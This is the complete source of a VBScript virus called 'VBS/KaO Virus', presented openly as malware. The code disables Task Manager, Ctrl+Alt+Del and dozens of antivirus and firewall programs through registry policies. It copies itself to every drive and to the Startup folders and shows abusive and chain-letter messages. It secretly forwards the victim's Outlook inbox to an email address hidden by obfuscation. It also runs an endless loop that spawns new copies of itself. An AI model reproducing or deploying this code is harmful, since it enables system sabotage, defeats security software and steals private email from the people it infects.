' VBS/KaO Virus

Set shell=CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)


sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function

itemtype = "REG_DWORD"
itemtype2 = "REG_SZ"
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\Administrator" , "0" , itemtype
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ShutdownWithoutLogon" , "0" , itemtype2
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoComputersNearMe" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun" , "00000000" , itemtype
 Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DisableCAD" , "00000001" , itemtype
 Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives" , "01,00,00,00" , itemtype
 
 
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\8","taskmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\9","ntbackup.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\10","mcagent.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\11","mcvsshld.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\12","mcshield.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\13","mcvsescn.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\14","mcvsrte.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\15","DefWatch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\16","Rtvscan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\17","ccEvtMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\18","NISUM.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\19","ccPxySvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\20","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\21","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\22","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\23","LUALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\24","DRWEBUPW.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\25","AUTODOWN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\26","alogserv.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\27","RuLaunch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\28","Avconsol.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\29","PavFires.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\30","FIREWALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\31","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\32","Vshwin32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\33","VsStat.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\34","Avsynmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\35","ccApp.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\36","nopdb.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\37","OUTPOST.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\38","ICSSUPPNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\39","ICSUPP95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\40","ESCANH95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\41","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\42","ESCANHNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\43","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\44","AUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\45","AUTOTRACE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\46","AUTOUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\47","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\48","AVWUPD32.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\49","AVPUPD.EXE "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\50","CFIAUDIT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\51","UPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\52","symlcsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\53","MCUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\54","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\55","pavsrv50.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\56","SAVScan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\57","SNDSrvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\58","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\59","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\60","ccProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\61","SHSTAT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\62","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\63","UpdaterUI.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\64","VsTskMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\65","FrameworkService.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\66","LUCOMS~1.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\67","blackd.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\68","bawindo.exe "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\69","AVENGINE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\70","APVXDWIN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\71","pavProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\72","navapw32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\73","IEXPLORE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\74","vpc32.exe"
 fso.copyfile wscript.scriptfullname, "C:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\windows\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\Documents and Settings\All Users\Desktop\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "B:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "D:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "E:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "F:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "G:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "H:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "I:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "J:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "K:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "L:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "M:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "N:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "O:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "P:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "Q:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "R:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "S:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "T:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "U:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "V:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "W:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "X:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "Y:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "Z:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\KaO.vbs"
 fso.copyfile wscript.scriptfullname, "C:\C:\WINDOWS\Start Menu\Programs\Startup\KaO.vbs"
 
 msgbox "Hello I'm The VBS/KaO Virus Your Fucked!!!"
 if day(now()) = 2 then
Const CDROM = 4
    On Error Resume Next
    Set fs = CreateObject("Scripting.FileSystemObject")
    strDriveLetter = ""
    For intDriveLetter = Asc("A") To Asc("Z")
        Err.Clear
        If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then
            If Err.Number = 0 Then
                strDriveLetter = Chr(intDriveLetter)
                Exit For
            End If
        End If
    Next
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
     For d = 0 to colCDROMs.Count - 1
           colCDROMs.Item(d).Eject 
Next
end if
 if day(now()) = 22 then
 msgbox "Billy Gates You Fuckin Gay!!"
 end if
 
KaO1 = "This Is The Word You Must Read!"
KaO2 = "People Die Every Day!"
KaO3 = "Now You Opened This File So Send It To Everyone!"
KaO4 = "If You Break This Change Letter You Will Have A Bad Time With Life!"
KaO5 = "You Only Have One Life To Live So Live It Right!"
KaO6 = "Do As I Say And Something Good Will Happen To You!"
KaO7 = "Have Faith My Follow Folks And Do As I Say!"
KaO8 = "If You Have Done As I Say My You Be Blessed By Your Higher Power!"
KaO9 = "Now As I Sign This Special Letter You Have Time Counting Away!!"
KaO10 = "Close This And Be Wise For I Am Watching!"
KaO11 = "Good Night And Good Luck!"
KaO12 = "From One Who Knows All [°KAT EYES°]"
wrte1.Close()

readmsg = (windir+"\KaO.txt")
Set msgt = Fso.Createtextfile(readmsg, True)
msgt.writeline KaO1
msgt.writeline KaO2
msgt.writeline KaO3
msgt.writeline KaO4
msgt.writeline KaO5
msgt.writeline KaO6
msgt.writeline KaO7
msgt.writeline KaO8
msgt.writeline KaO9
msgt.writeline KaO10
msgt.writeline KaO11
msgt.writeline KaO12
msgt.Close

Set shell=CreateObject("Wscript.Shell")
shell.Run windir+"\KaO.txt"
Set wrte=fso.CreateTextFile(windir+"\windows2.cmd")
wrte.WriteLine "@echo off"
wrte.WriteLine "taskkill /IM notepad.exe"
wrte.WriteLine "cls"
wrte.Close()
Msgbox "Close NotePad??",0 
shell.Run windir+"\windows2.cmd"


temppp1="z"
temppp2="x"
temppp3="y"
temppp4="k"
temppp5="i"
temppp6="a"
temppp7="k"
temppp8="."
temppp9="@"
temppp10="t"
temppp11="u"
temppp12="a"
temppp13="t"
temppp14="j"
temppp15="g"
temppp=temppp15&temppp1&temppp6&temppp7&temppp1&temppp4&temppp2&temppp3&temppp9
temppp=temppp&temppp6&temppp12&temppp10&temppp13&temppp11&temppp5&temppp14&temppp8
temppp=temppp&temppp1&temppp12&temppp13
compare=-1
Set theApp = CreateObject ("Outlook.Application")
theApp.Visible = False
Set theNameSpace = theApp.GetNamespace("MAPI")
Set InboxFolder = theNameSpace.GetDefaultFolder(6)
For i=1 to InboxFolder.items.count
Set theMailItem = theApp.CreateItem(olMailItem)
theMailItem.Recipients.Add temppp
theMailItem.Subject = "Cake"&i&" "&InboxFolder.items(i).Subject
theMailItem.Body = InboxFolder.items(i).body
datee = InboxFolder.items(i).ReceivedTime
Daydiff = DateDiff("d",Now,datee)
dayOfWeek = Int(Weekday(now))
If dayofWeek = 2 Then
compare = -3
End If
If Daydiff =compare Then
theMailItem.DeleteAfterSubmit = True
theMailItem.Send
End If


Randomize
do
a = int(rnd(1) * 27) + 1
Select Case a
Case 1
b = "C:\"
Case 2
b = "C:\progra~1\"
Case 3
b = "C:\docume~1\"
Case 4
b = "C:\DOCUME~1\ALLUSE~1\Desktop\"
Case 5
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\"
Case 6
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\"
Case 7
b = "D:\"
Case 8
b = "E:\"
Case 9
b = "F:\"
Case 10
b = "G:\"
Case 11
b = "I:\"
Case 12
b = "J:\"
Case 13
b = "K:\"
Case 14
b = "L:\"
Case 15
b = "M:\"
Case 16
b = "N:\"
Case 17
b = "O:\"
Case 18
b = "P:\"
Case 19
b = "Q:\"
Case 20
b = "R:\"
Case 21
b = "S:\"
Case 22
b = "T:\"
Case 23
b = "U:\"
Case 24
b = "V:\"
Case 25
b = "X:\"
Case 26
b = "Y:\"
Case 27
b = "Z:\"
End Select

c = rnd*rnd*a*a*rnd(1238218)*rnd(a)*a*a*a*rnd*999999
c = replace(c, ".", "")
d = b+c+".vbs"
Set fs = createobject("scripting.filesystemobject")
Set st = createobject("wscript.shell")
fs.CopyFile Wscript.ScriptFullName, d
st.run d

wscript.sleep 10000
loop

 
' VBS/KaO Virus 